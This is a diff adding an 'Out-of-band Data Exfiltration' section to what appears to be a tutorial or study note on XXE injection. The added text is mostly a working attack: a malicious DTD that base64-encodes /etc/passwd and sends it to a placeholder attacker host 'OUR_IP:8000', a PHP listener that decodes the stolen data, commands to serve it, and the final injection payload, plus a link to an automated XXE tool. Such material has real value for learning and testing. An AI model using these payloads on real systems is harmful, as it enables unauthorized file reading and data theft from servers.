@@ -117,3 +117,45 @@ and then we launch our http server and add this to the vitime payload
     %error;
     ]>
 ```
+
+## Out-of-band Data Exfiltration
+
+This method, we will make the server convert the file to base64 and send it to us directly with those two tags :
+
+so we write an xxe.dtd as follow 
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+we can write this php file to directly decode tha base64 received and run http server with php
+
+```php
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+```
+and then
+
+  ```
+  vi index.php # here we write the above PHP code
+  php -S 0.0.0.0:8000
+  ```
+  
+finally the injection payload as follow:
+
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+
+to finish take a look to an automated tool for xxe:
+
+  git clone https://github.com/enjoiz/XXEinjector.git
